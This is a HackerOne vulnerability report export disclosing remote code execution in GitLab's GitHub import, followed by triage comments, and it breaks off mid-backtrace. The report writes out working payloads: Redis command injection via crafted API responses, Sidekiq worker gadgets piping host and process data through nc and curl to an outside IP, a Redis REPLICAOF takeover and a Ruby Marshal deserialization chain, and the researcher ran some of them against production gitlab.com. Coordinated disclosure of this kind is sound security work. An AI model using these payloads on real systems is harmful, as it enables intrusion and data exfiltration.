{
  "id": 1672388,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNjcyMzg4",
  "url": "https://hackerone.com/reports/1672388",
  "title": "RCE via github import",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "critical",
  "readable_substate": "Resolved",
  "created_at": "2022-08-17T12:18:56.586Z",
  "submitted_at": "2022-08-17T12:18:56.726Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "yvvdwf",
    "url": "/yvvdwf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2022-11-16T01:10:35.826Z",
  "bug_reporter_agreed_on_going_public_at": "2022-11-04T16:48:31.864Z",
  "team_member_agreed_on_going_public_at": "2022-11-16T01:10:35.668Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello,\n\nWhile continuing mining on [github import](https://hackerone.com/reports/1665658), I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.\n\nGitlab uses Octokit to get data from github.com. Octokit uses [Sawyer::Resource](https://github.com/lostisland/sawyer/blob/master/lib/sawyer/resource.rb) to represent results.\n\nSawyer is a crazy class that [converts](https://github.com/lostisland/sawyer/blob/f5f080d5c5260e094069139ffc7c13d0acba4ab5/lib/sawyer/resource.rb#L81) a hash to an object whose methods are based on the hash's key:\n\n```ruby\nirb(main):641:0> Sawyer::VERSION\n=> \"0.8.2\"\nirb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(\"\"), to_s: \"example\", length: 1)\n=> \n{:to_s=>\"example\", :length=>1}\n...\nirb(main):643:0> a.to_s\n=> \"example\"\nirb(main):644:0> a.length\n=> 1\n```\n\nGitlab uses directly the responded Sawyer object in few functions, such as, the `id` variable in [this function](https://gitlab.com/gitlab-org/gitlab/-/blob/99f5db917a33ad9466f35918a1da454ed397be8e/lib/gitlab/github_import/parallel_scheduling.rb#L145):\n\n```ruby\n      def already_imported?(object)\n        id = id_for_already_imported_cache(object)\n\n        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)\n      end\n```\n\nNormally, `id` should be a number. However when `id` is `{\"to_s\": {\"bytesize\": 2, \"to_s\": \"1234REDIS_COMMANDS\" }}`, we can inject additional redis commands by using `bytesize` to limit the previous command when it [is constructed](https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L8) (although the `bytesize` is `2` we need to reserve 4 bytes as 2 additional bytes for CLRF):\n\n```ruby\n      def build_command(args)\n        command = [nil]\n\n        args.each do |i|\n          if i.is_a? Array\n            i.each do |j|\n              j = j.to_s\n              command << \"$#{j.bytesize}\"\n              command << j\n            end\n          else\n            i = i.to_s\n            command << \"$#{i.bytesize}\"\n            command << i\n          end\n        end\n```\n\nAs we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:\n\n```\nlpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \\').read\\\"],\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n\nI tested this redis command first on my own gitlab instance and it worked. \n\nI then tested on gitlab.com but got nothing. I tried another by replacing basically `nc` by `curl` but no luck:\n\n```\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n\nAlthough the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command `REPLICAOF 51.75.74.52 11211\\n\\n` to test gitlab.com and I got a ping from your redis server to my server `nc -vlkp 11211`:\n\n{F1871024}\n\nThis means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command `REPLICAOF no one\\n\\n`. No information from your redis server has been replicated to mine as I used `nc` and I got only the `ping` messages.\n\n\nBy checking on my local instance at `/var/opt/gitlab/redis/redis.conf`, I see that only `keys` command is disable. I did not try `FLUSHALL` to write data to file as it is too dangerous.\n\nAs gitlab uses redis as a cache storage, so I tried to reach RCE via `Marshal.dump` method. I tested the following payload on gitlab.com to poison the avatar of my project via the key `cache:gitlab:avatar:yvvdwf/xss:16210710`:\n\n```\n\\r\\n*3\\r\\n$3\\r\\nset\\r\\n$39\\r\\ncache:gitlab:avatar:yvvdwf/xss:16210710\\r\\n$347\\r\\n\\u0004\\b[\\bc\\u0015Gem::SpecFetcherc\\u0013Gem::InstallerU:\\u0015Gem::Requirement[\\u0006o:\\u001cGem::Package::TarReader\\u0006:\\b@ioo:\\u0014Net::BufferedIO\\u0007;\\u0007o:#Gem::Package::TarReader::Entry\\u0007:\\n@readi\\u0000:\\f@headerI\\\"\\u0006a\\u0006:\\u0006ET:\\u0012@debug_outputo:\\u0016Net::WriteAdapter\\u0007:\\f@socketo:\\u0014Gem::RequestSet\\u0007:\\n@setso;\\u000e\\u0007;\\u000fm\\u000bKernel:\\u000f@method_id:\\u000bsystem:\\r@git_setI\\\".(hostname; ps aux) | nc 51.75.74.52 11211\\u0006;\\fT;\\u0012:\\fresolve\\r\\n\\r\\n\n```\n\nAlthough I did not get RCE but it seems working as I got `500` error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP `51.75.74.52`\n\n{F1871025}\n\n# Steps to reproduce\n\nThe steps to reproduce should be the same as this [one](https://hackerone.com/reports/1665658)\n\nThe following steps are to reproduce on a local gitlab instance whose domain is `http://gitlab.example.com`:\n\n# Step to reproduce\n\nTo reproduce, we need the following prerequisite: \n\n- A VM/machine to host the dummy server  with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)\n- I created the dummy server using nodejs, so you need to have also nodejs on the machine\n- A Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within `api` scope.\n\n\n# Step 1: run the dummy server\n\n- Copy the attachment file on your machine and decompress it to any folder, e.g., `/tmp/dummy-server`\n- *Modify the attack payload* as you need inside `redis_command.txt` file, the default value is to execute the command `(hostname; ps aux) > /tmp/ahihi`:\n```\n lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\n```\n- Go to `/tmp/dummy-server` then run this command: `node ./index.js YOUR_IP YOUR_PORT` in which, you should replace `IP` and `PORT` with the one you have. For example, `sudo node index.js 51.75.74.52 80`\n\n# Step 2: trigger Gitlab import\n\n- Open a new terminal, then run the following command, in which:\n\n   + `YOUR_IP` and `YOUR_PORT` are the values in the previous step\n   + `YOUR_GITLAB_TOKEN` is the api token you've created in the pre-requirement\n   + `YOUR_GITLAB_USERNAME` is the target namespace you want to import the project to. It can be your username, or a group name\n\n```bash\ncurl -kv \"http://gitlab.example.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN\" \\\n  --data '{\n    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n    \"repo_id\": \"356289002\",\n    \"target_namespace\": \"YOUR_GITLAB_USERNAME\",\n    \"new_name\": \"poc-rce\",\n    \"github_hostname\": \"http://YOUR_IP:YOUR_PORT\"\n}'\n```\n\nFor example:\n\n```bash\ncurl \"http://gitlab.example.com/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx\" \\\n  --data '{\n    \"personal_access_token\": \"xxxxx\",\n    \"repo_id\": \"356289002\",\n    \"target_namespace\": \"root\",\n    \"new_name\": \"NEW-NAME-'$(date +%s)'\",\n    \"github_hostname\": \"http://ns.yvvdwf.me:80\"\n}'\n```\n\n- View the result in `/etc/ahihi`\n\n## Impact\n\nAny one the the ability to call `api/v4/import/github` endpoint could achieve RCE via a specially crafted responses",
  "weakness": {
    "id": 59,
    "name": "OS Command Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 1871024,
      "file_name": "redis_replicaof.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z6sgzmwezby006npwc9j0ldbjn1u?response-content-disposition=attachment%3B%20filename%3D%22redis_replicaof.png%22%3B%20filename%2A%3DUTF-8%27%27redis_replicaof.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065853Z&X-Amz-Expires=1682&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2cda9eb7bb900a4d04a41b1adf598e0c14f2d822050d6e4a1f4663b22fc18820",
      "file_size": 52874,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1871025,
      "file_name": "something_went_wrong.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xoox16h9axvyujjvuaz68uysc1x0?response-content-disposition=attachment%3B%20filename%3D%22something_went_wrong.png%22%3B%20filename%2A%3DUTF-8%27%27something_went_wrong.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065853Z&X-Amz-Expires=1682&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5165b929c2d44beda8d1f4d8edd993de36e841088dfb26cafc2287c5ae4ace9f",
      "file_size": 376187,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 1871041,
      "file_name": "rce.tar.gz",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dn1a438rwug9y3w2x4ycf36sr972?response-content-disposition=attachment%3B%20filename%3D%22rce.tar.gz%22%3B%20filename%2A%3DUTF-8%27%27rce.tar.gz&response-content-type=application%2Fgzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQSL26QVWJ%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065853Z&X-Amz-Expires=1682&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJGMEQCIGsYX%2B2SBOyOVYF%2Bbhi8FJSYZBaFBWa1bRzT%2Be3B%2FZjKAiAhOYWk%2Foi9Uzlh7TDqFekha1XoJLvg7HRX6M15Zy7OgyqyBQgiEAMaDDAxMzYxOTI3NDg0OSIMMFtgJWJNe1jj9nkVKo8F8Rs2Uaqvx6JwF6x1kZKjsrSeZ6cQNBwN5Wb9hls0EDyKQtSi4OIwgPbnTQubX83nd5ah2LnVEbBjw%2FeWeXliDAl%2FvcfL7Jr%2Bw%2B9Zt%2FJIPwgok0yh0yrBt%2FMHKf6jKyg1HXYfn1nmhzeOD2d2QJDCj5sOXpB7wiW08myHF2gOX%2FhtSISZCSevxv8fM25ODarqeeS4hfv%2BLEDgbFHbbT4E1NfuF8ED2tZiBSFh5%2B5GRH9tDuQNiRc11PuPiSwjorAQR%2BvNEGNjQmE4t1MC7CZ%2FcXGauTAzCS%2Fc%2Bwn34cAFOc2Tg5jVrz6xBNrLQkxxdjHvIBsqLMrTz%2FQ1LCnEECdd957bMTmgqAVSbGeqK2LjKaZ7j4m37weF8D66L%2Fffl0dc0inkPwRnTr0ZTF3%2FEIXdlA2Vp1lgDGet58F%2BpNSEEcSdhnS7xtwxDjXz7C3kS7O6OfaRyAO8ZJGUZmveDph6o2cw%2FPsTphMY2pbm6Pkz07sTZkxdV2fxo92Zo9qpNDPWqHn3gm%2BKAywtq0nQug0bAkV%2FgWYEYrziFLkzRomPvJSGDNHpwb6peEgKF5g4GJGCx3qCurJLfQPIC0AnVFKhpoWvaa%2FLQL6ChC6wGDy6Tl4OOwSd%2FOSuJCnSq1CwWZzdKfyQ3%2FDgDtgklpCj5%2FeQ53M5BpI6bTmGvzUZjPOclF5%2Brk%2BemsD13H7ZHfb96cFvwLHSHT62xRD0NXavKkuuUbg6LMZnfAUOCCZaZmBR2hjJCA9pJ0xHeRcvfG6FoXGmUapCjaCdA4pe1w1dwvfbrvpL4x2tCA%2Bf6zSRP427wTuP50SgkLkxX05dtO4svq%2BPfjeeMMqWgotYcj%2FN%2FVBQbQBRszE8Iw8WK1KakxxWqjDf%2BbioBjqyAe46EFyZlnjpkAH7Kxwo2RjFWK1UspOuXEko65zIpUW0G3QveRljnTHuFnmELUOY%2FbuoPKctkCKm4MSlL4vdbCrHPpvodCNBNct%2B0piCNeqN4cIPMf7KzWsae1GnSb7AF3GE0%2F8QNvzYw3DDJv0zie%2F87QMf%2FxeBFJFnoI1vuhAwg3Nhex5lw1vtQrfVTrYy%2F9P2yDEji39vZEEsb9yVzOIzAXuAyTq%2F%2F9TNfW%2Bn16NAsB8%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ecbf251e303cea54ba9fd6c79d3071015ac4fcc7a8d7a890456e752fc1592667",
      "file_size": 5112,
      "type": "application/gzip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": null,
  "vote_count": 260,
  "voters": [
    "omarelfarsaoui",
    "jumpydata",
    "randomrootx",
    "math-lover",
    "inspector-ambitious",
    "napkin",
    "green-jam",
    "j3rry-1729",
    "svalkanov",
    "bulldawg",
    "and 250 more..."
  ],
  "severity": {
    "rating": "critical",
    "score": 9.9,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "none",
      "scope": "changed",
      "confidentiality": "high",
      "integrity": "high",
      "availability": "high"
    }
  },
  "structured_scope": {
    "databaseId": 39022,
    "asset_type": "OTHER",
    "asset_identifier": "Your Own GitLab Instance",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 18023757,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hi @yvvdwf,\n\nThank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nHave a great day! \n\nKind regards,\n@long_cat",
      "automated_response": false,
      "created_at": "2022-08-17T22:56:10.244Z",
      "updated_at": "2022-08-17T22:56:10.244Z",
      "actor": {
        "username": "h1_analyst_kenny",
        "cleared": false,
        "verified": false,
        "url": "/h1_analyst_kenny",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/km1cnxeipy9i2ds59qd7i14jr1gf/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": true,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18024325,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "Hi @yvvdwf,\n\nThanks for reporting this. I've tried with both a docker install and omnibus install using the latest version of GitLab and can't reproduce it. I've checked in `/etc/` and `/tmp/` (incl inside the docker container) for both types of installs and `ahihi` did not exist. \n\nOn the test GitLab instance I created a user called `yvvdwf` so it would match your payloads and be more likely to succeed.\n\nI can see that GitHub import did make requests to the test server, here are the logs:\n\n```\ncurl -kv \"http://REDACTED/api/v4/import/github\" \\\n  --request POST \\\n  --header \"content-type: application/json\" \\\n  --header \"PRIVATE-TOKEN: REDACTED\" \\\n  --data '{\n    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n    \"repo_id\": \"356289002\",\n    \"target_namespace\": \"yvvdwf\",\n    \"new_name\": \"poc-rce\",\n    \"github_hostname\": \"http://54.87.180.200:80\"\n}'\nNote: Unnecessary use of -X or --request, POST is already inferred.\n*   Trying REDACTED...\n* Connected toREDACTED port 80 (#0)\n> POST /api/v4/import/github HTTP/1.1\n> Host: REDACTEDamazonaws.com\n> User-Agent: curl/7.79.1\n> Accept: */*\n> content-type: application/json\n> PRIVATE-TOKEN: REDACTED\n> Content-Length: 214\n>\n* Mark bundle as not supporting multiuse\n< HTTP/1.1 500 Internal Server Error\n< Server: nginx\n< Date: Wed, 17 Aug 2022 23:05:50 GMT\n< Content-Type: application/json\n< Content-Length: 39\n< Connection: keep-alive\n< Cache-Control: no-cache\n< Vary: Origin\n< X-Request-Id: 01GAQ0WMD6K14GZTVJG37TAS3R\n< X-Runtime: 0.101985\n<\n* Connection #0 to host REDACTED.amazonaws.com left intact\n{\"message\":\"500 Internal Server Error\"}\n```\n\nOn the server:\n\n```\n2022-08-17T23:05:50.311Z\n7. new connection from  REDACTED\n> GET /api/v3/rate_limit\n> request_id: _api_v3_rate_limit\n> user-agent: Octokit Ruby Gem 4.20.0\n> accept: application/vnd.github.v3+json\n> content-type: application/json\n> authorization: token ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n> accept-encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\n> host: REDACTED\n>\n<  send file: _api_v3_rate_limit.res.body.txt\n\n2022-08-17T23:05:50.320Z\n8. new connection from  REDACTED\n> GET /api/v3/rate_limit\n> request_id: _api_v3_rate_limit\n> user-agent: Octokit Ruby Gem 4.20.0\n> accept: application/vnd.github.v3+json\n> content-type: application/json\n> authorization: token ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n> accept-encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\n> host: REDACTED\n>\n<  send file: _api_v3_rate_limit.res.body.txt\n\n2022-08-17T23:05:50.326Z\n9. new connection from  REDACTED\n> GET /api/v3/repositories/356289002\n> request_id: _api_v3_repositories_356289002\n> user-agent: Octokit Ruby Gem 4.20.0\n> accept: application/vnd.github.v3+json\n> content-type: application/json\n> authorization: token ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n> accept-encoding: gzip;q=1.0,deflate;q=0.6,identity;q=0.3\n> host: REDACTED\n>\n\n2022-08-17T23:07:56.438Z\n10. new connection from  REDACTED\n> GET /\n> request_id: _\n> host: REDACTED\n> user-agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36\n> content-length: 0\n>\n\n```\n\nCan you provide a video of this exploit using a self-hosted version of GitLab (not Gitlab.com)?\n\nCheers,\nNick Malcolm\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-08-17T23:13:16.231Z",
      "updated_at": "2022-08-17T23:13:16.231Z",
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18024398,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "Hi, it seems that the dummy server is blocked at the 10th request that was sent by your Web browser. Consequently it cannot continue serving the import requests from gitlab. Could you please try again without doing any external requests to the dummy server by your Web browser. Otherwise I will do a video tomorrow morning. Best",
      "automated_response": false,
      "created_at": "2022-08-17T23:43:38.192Z",
      "updated_at": "2022-08-17T23:43:38.192Z",
      "actor": {
        "username": "yvvdwf",
        "cleared": false,
        "verified": false,
        "url": "/yvvdwf",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/ubqmt760dugarh527x4qc4mkdn4n/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18024469,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "@yvvdwf if it helps, here is the error from my omnibus install of GitLab when the import is attempted:\n\n```\n==> /var/log/gitlab/gitlab-rails/production.log <==\nStarted POST \"/api/v4/import/github\" for REDACTED at 2022-08-17 23:55:05 +0000\n\n==> /var/log/gitlab/gitlab-rails/exceptions_json.log <==\n{\"severity\":\"ERROR\",\"time\":\"2022-08-17T23:55:05.368Z\",\"correlation_id\":\"01GAQ3PT6KHK32N2PEJ213N9AY\",\"exception.class\":\"NoMethodError\",\"exception.message\":\"undefined method `description' for []:Array\",\"exception.backtrace\":[\"lib/gitlab/legacy_github_import/project_creator.rb:21:in `execute'\",\"app/services/import/github_service.rb:45:in `create_project'\",\"app/services/import/github_service.rb:24:in `execute'\",\"lib/api/import_github.rb:48:in `block in \\u003cclass:ImportGithub\\u003e'\",\"ee/lib/gitlab/middleware/ip_restrictor.rb:14:in `block in call'\",\"ee/lib/gitlab/ip_address_state.rb:10:in `with'\",\"ee/lib/gitlab/middleware/ip_restrictor.rb:13:in `call'\",\"lib/api/api_guard.rb:213:in `call'\",\"lib/gitlab/metrics/elasticsearch_rack_middleware.rb:16:in `call'\",\"lib/gitlab/middleware/memory_report.rb:13:in `call'\",\"lib/gitlab/middleware/speedscope.rb:13:in `call'\",\"lib/gitlab/database/load_balancing/rack_middleware.rb:23:in `call'\",\"lib/gitlab/middleware/rails_queue_duration.rb:33:in `call'\",\"lib/gitlab/metrics/rack_middleware.rb:16:in `block in call'\",\"lib/gitlab/metrics/web_transaction.rb:46:in `run'\",\"lib/gitlab/metrics/rack_middleware.rb:16:in `call'\",\"lib/gitlab/jira/middleware.rb:19:in `call'\",\"lib/gitlab/middleware/go.rb:20:in `call'\",\"lib/gitlab/etag_caching/middleware.rb:21:in `call'\",\"lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'\",\"lib/gitlab/database/query_analyzer.rb:37:in `within'\",\"lib/gitlab/middleware/query_analyzer.rb:11:in `call'\",\"lib/gitlab/middleware/multipart.rb:173:in `call'\",\"lib/gitlab/middleware/read_only/controller.rb:50:in `call'\",\"lib/gitlab/middleware/read_only.rb:18:in `call'\",\"lib/gitlab/middleware/same_site_cookies.rb:27:in `call'\",\"lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'\",\"lib/gitlab/middleware/basic_health_check.rb:25:in `call'\",\"lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in 